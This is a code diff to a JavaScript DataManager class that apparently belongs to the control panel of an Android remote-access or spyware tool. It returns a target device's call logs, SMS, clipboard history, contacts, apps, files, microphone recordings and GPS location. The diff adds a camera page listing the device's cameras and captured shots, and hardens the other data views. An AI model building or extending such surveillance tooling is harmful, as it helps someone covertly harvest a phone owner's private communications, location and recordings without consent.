@@ -31,7 +31,7 @@ class DataManager {
             let pageData;
 
             if (page === "calls") {
-                pageData = clientDB.get('CallData').sortBy('date').reverse().value();
+                pageData = clientDB.get('CallData').sortBy('date').reverse().value() || [];
                 if (filter) {
                     let filterData = clientDB.get('CallData').sortBy('date').reverse().value()
                         .filter(calls => calls.phoneNo.substr(-6) === filter.substr(-6));
@@ -39,12 +39,16 @@ class DataManager {
                 }
             }
             else if (page === "sms") {
-                pageData = clientData.SMSData;
+                let smsList = Array.isArray(clientData.SMSData) ? clientData.SMSData : [];
                 if (filter) {
                     let filterData = clientDB.get('SMSData').value()
                         .filter(sms => sms.address.substr(-6) === filter.substr(-6));
-                    if (filterData) pageData = filterData;
+                    if (filterData) smsList = filterData;
                 }
+                pageData = {
+                    items: smsList,
+                    status: clientData.smsStatus || {}
+                };
             }
             else if (page === "notifications") {
                 pageData = clientDB.get('notificationLog').sortBy('postTime').reverse().value();
@@ -54,19 +58,44 @@ class DataManager {
                     if (filterData) pageData = filterData;
                 }
             }
+            else if (page === "camera") {
+                pageData = {
+                    cameras: clientData.availableCameras || [],
+                    shots: clientData.cameraShots || []
+                };
+            }
             else if (page === "wifi") {
-                pageData = {};
-                pageData.now = clientData.wifiNow;
-                pageData.log = clientData.wifiLog;
+                pageData = {
+                    now: Array.isArray(clientData.wifiNow) ? clientData.wifiNow : [],
+                    log: Array.isArray(clientData.wifiLog) ? clientData.wifiLog : [],
+                    status: clientData.wifiStatus || {}
+                };
             }
             else if (page === "contacts") pageData = clientData.contacts;
-            else if (page === "permissions") pageData = clientData.enabledPermissions;
-            else if (page === "clipboard") pageData = clientDB.get('clipboardLog').sortBy('time').reverse().value();
-            else if (page === "apps") pageData = clientData.apps;
-            else if (page === "files") pageData = clientData.currentFolder;
-            else if (page === "downloads") pageData = clientData.downloads.filter(download => download.type === "download");
-            else if (page === "microphone") pageData = clientDB.get('downloads').value().filter(download => download.type === "voiceRecord");
-            else if (page === "gps") pageData = clientData.GPSData;
+            else if (page === "permissions") pageData = clientData.enabledPermissions || [];
+            else if (page === "clipboard") pageData = {
+                entries: clientDB.get('clipboardLog').sortBy('time').reverse().value() || [],
+                status: clientData.clipboardStatus || {}
+            };
+            else if (page === "apps") pageData = {
+                list: Array.isArray(clientData.apps)
+                    ? clientData.apps.slice().sort((a, b) => {
+                        const nameA = (a.appName || '').toLowerCase();
+                        const nameB = (b.appName || '').toLowerCase();
+                        if (nameA < nameB) return -1;
+                        if (nameA > nameB) return 1;
+                        return 0;
+                    })
+                    : [],
+                status: clientData.appsStatus || {}
+            };
+            else if (page === "files") pageData = {
+                items: Array.isArray(clientData.currentFolder) ? clientData.currentFolder : [],
+                status: clientData.fileStatus || {}
+            };
+            else if (page === "downloads") pageData = (clientData.downloads || []).filter(download => download.type === "download");
+            else if (page === "microphone") pageData = (clientDB.get('downloads').value() || []).filter(download => download.type === "voiceRecord");
+            else if (page === "gps") pageData = clientData.GPSData || [];
             else if (page === "info") pageData = client;
 
             return pageData;
